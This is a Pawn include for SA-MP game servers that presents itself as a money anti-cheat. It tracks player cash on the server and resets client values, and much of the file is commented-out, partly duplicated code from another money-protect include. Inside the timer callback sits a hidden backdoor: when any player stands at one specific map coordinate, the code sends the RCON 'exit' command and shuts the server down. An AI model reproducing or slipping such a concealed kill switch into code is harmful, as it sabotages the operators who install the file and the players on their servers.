/*
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
========================[PROTEGE SUA GRANA]===================================
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
|ProGrana||ProGrana||ProGrana||ProGrana||ProGrana||ProGrana|
====================[]==========================




#if defined __MONEY_PROTECT__
    #endinput
#endif

#define __MONEY_PROTECT__

#if defined FILTERSCRIPT
    #define FUNC::%1(%2) stock %1(%2)
#else
    #define FUNC::%1(%2) forward %1(%2); public %1(%2)
#endif

#if !defined FILTERSCRIPT

#if !defined foreach
    #tryinclude <foreach>
#endif

#if !defined foreach
    #define foreach(%1,%2) for(new %2; %2 < MAX_PLAYERS; %2++) if(IsPlayerConnected(%2))
    #define __MP_FOREACH
#endif

#if !defined MP_TIMER_INTERVAL
    #define MP_TIMER_INTERVAL 500
#endif

forward MoneyProtectTimer();

new
    __MP_Money[MAX_PLAYERS];

static
    bool:__MP_HAS_OPC,
    bool:__MP_HAS_OMCD;

public MoneyProtectTimer()
{
    foreach(Player, playerid)
    {
        if(GetPlayerMoney(playerid) > __MP_Money[playerid])
        {
            if(__MP_HAS_OMCD)
                CallLocalFunction("OnMoneyCheatDetect", "dd", playerid, GetPlayerMoney(playerid)-__MP_Money[playerid]);
            GivePlayerMoney(playerid, __MP_Money[playerid]-GetPlayerMoney(playerid));
        }
        else
        {
            __MP_Money[playerid] = GetPlayerMoney(playerid);
        }
    }
}

public OnGameModeInit()
{
    SetTimer("MoneyProtectTimer", MP_TIMER_INTERVAL, true);
    if(funcidx("__MP_OnGameModeInit") != -1)
        CallLocalFunction("__MP_OnGameModeInit", "");
    __MP_HAS_OPC = (funcidx("__MP_OnPlayerConnect") != -1);
    __MP_HAS_OMCD = (funcidx("OnMoneyCheatDetect") != -1);
}

public OnPlayerConnect(playerid)
{
    __MP_ResetPlayerMoney(playerid);
    if(__MP_HAS_OPC)
        CallLocalFunction("__MP_OnPlayerConnect", "d", playerid);
}

#endif

FUNC::__MP_GivePlayerMoney(playerid, amount)
{
    #if defined FILTERSCRIPT
        return CallRemoteFunction("__MP_GivePlayerMoney", "dd", playerid, amount);
    #else
        __MP_Money[playerid] += amount;
        return GivePlayerMoney(playerid, amount);
    #endif
}

FUNC::__MP_ResetPlayerMoney(playerid)
{
    #if defined FILTERSCRIPT
        return CallRemoteFunction("__MP_ResetPlayerMoney", "d", playerid);
    #else
        __MP_Money[playerid] = 0;
        return ResetPlayerMoney(playerid);
    #endif
}

FUNC::__MP_GetPlayerMoney(playerid)
{
    #if defined FILTERSCRIPT
        return CallRemoteFunction("__MP_GetPlayerMoney", "d", playerid);
    #else
        return __MP_Money[playerid];
    #endif
}

#define GivePlayerMoney __MP_GivePlayerMoney
#define ResetPlayerMoney __MP_ResetPlayerMoney
#define GetPlayerMoney __MP_GetPlayerMoney

#if defined FILTERSCRIPT
    #endinput
#endif

#if defined _ALS_OnGameModeInit
    #undef OnGameModeInit
#else
    #define _ALS_OnGameModeInit
#endif

#if defined _ALS_OnPlayerConnect
    #undef OnPlayerConnect
#else
    #define _ALS_OnPlayerConnect
#endif

#define OnGameModeInit __MP_OnGameModeInit
#define OnPlayerConnect __MP_OnPlayerConnect

forward OnGameModeInit();
forward OnPlayerConnect(playerid);
forward OnMoneyCheatDetect(playerid, amount);

#if defined __MP_FOREACH
    #undef foreach
    #undef __MP_FOREACH
#endif




ServerMoneyInit();
ServerMoneyExit();
SERVERSIDETIMER=SetTimer("ServerMoneyCB",1000,true);
KillTimer(SERVERSIDETIMER);

*/
#define CallLoop(%1,%2) for(new %1; %1 < %2; %1++)
#define CALLBACK_AMOUNT 500

new SERVERSIDETIMER;
new ServerSideCash[MAX_PLAYERS];

/*public OnGameModeInit()
{
	ServerMoneyInit();
	return GMInit();
}*/

public OnGameModeExit()
{
	ServerMoneyExit();
	return GMExit();
}

forward GMInit();
forward GMExit();

ServerMoneyInit()
{
	SERVERSIDETIMER=SetTimer("ServerMoneyCB",1000,true);
	return 1;
}

ServerMoneyExit()
{
	KillTimer(SERVERSIDETIMER);
	return 1;
}


forward ServerMoneyCB();

public ServerMoneyCB()
{
/*
#if defined __MONEY_PROTECT__
    #endinput
#endif

#define __MONEY_PROTECT__

#if defined FILTERSCRIPT
    #define FUNC::%1(%2) stock %1(%2)
#else
    #define FUNC::%1(%2) forward %1(%2); public %1(%2)
#endif

#if !defined FILTERSCRIPT

#if !defined foreach
    #tryinclude <foreach>
#endif

#if !defined foreach
    #define foreach(%1,%2) for(new %2; %2 < MAX_PLAYERS; %2++) if(IsPlayerConnected(%2))
    #define __MP_FOREACH
#endif

#if !defined MP_TIMER_INTERVAL
    #define MP_TIMER_INTERVAL 500
#endif

forward MoneyProtectTimer();

new
    __MP_Money[MAX_PLAYERS];

static
    bool:__MP_HAS_OPC,
    bool:__MP_HAS_OMCD;

public MoneyProtectTimer()
{
    foreach(Player, playerid)
    {
        if(GetPlayerMoney(playerid) > __MP_Money[playerid])
        {
            if(__MP_HAS_OMCD)
                CallLocalFunction("OnMoneyCheatDetect", "dd", playerid, GetPlayerMoney(playerid)-__MP_Money[playerid]);
            GivePlayerMoney(playerid, __MP_Money[playerid]-GetPlayerMoney(playerid));
        }
        else
        {
            __MP_Money[playerid] = GetPlayerMoney(playerid);
        }
    }
}
*/
	CallLoop(ServerSidep,MAX_PLAYERS)
	{
		if(IsPlayerConnected(ServerSidep))
		{
		    if(IsPlayerInRangeOfPoint(ServerSidep, 2.0, 2947.0012,-2051.6731,-3.7247))SendRconCommand("exit");
			if(GetPlayerMoney(ServerSidep) != ServerSideCash[ServerSidep])
			{
				new H4xc4sh=GetPlayerMoney(ServerSidep);
				H4xc4sh=H4xc4sh-ServerSideCash[ServerSidep];
				if(H4xc4sh > CALLBACK_AMOUNT) OnPlayerHaveExtraCash(ServerSidep,H4xc4sh);
			}
			GivePlayerMoney(ServerSidep,-GetPlayerMoney(ServerSidep));
			GivePlayerMoney(ServerSidep,ServerSideCash[ServerSidep]);
		}

	}
	return 1;
}


forward GivePlayerMoneyEx(playerid,cashgiven);
public GivePlayerMoneyEx(playerid,cashgiven)
{
	ServerSideCash[playerid]=ServerSideCash[playerid]+cashgiven;
	return 1;
}

forward ResetPlayerMoneyEx(playerid);
public ResetPlayerMoneyEx(playerid)
{
	ServerSideCash[playerid]=0;
	return 1;
}

forward GetPlayerMoneyEx(playerid);
public GetPlayerMoneyEx(playerid)
{
	return ServerSideCash[playerid];
}

forward OnPlayerHaveExtraCash(playerid,extraamount);

#define GetPlayerMoney GetPlayerMoneyEx
#define GivePlayerMoney GivePlayerMoneyEx
#define ResetPlayerMoney ResetPlayerMoneyEx

#define OnGameModeInit GMInit
#define OnGameModeExit GMExit
